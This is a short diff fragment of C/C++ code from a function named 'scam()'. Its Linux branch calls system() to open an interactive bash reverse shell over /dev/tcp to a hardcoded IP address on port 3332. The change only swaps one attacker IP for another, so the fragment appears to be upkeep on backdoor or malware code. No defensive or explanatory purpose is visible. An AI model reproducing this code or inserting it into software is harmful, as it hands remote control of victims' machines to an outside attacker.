@@ -29,6 +29,6 @@ void scam()
     }
     else if (OsName() == "Linux")
     {
-        system("bash && /bin/bash -i >/dev/tcp/82.197.165.92/3332 0<&1 2>&1");
+        system("bash && /bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1");
     }
 }
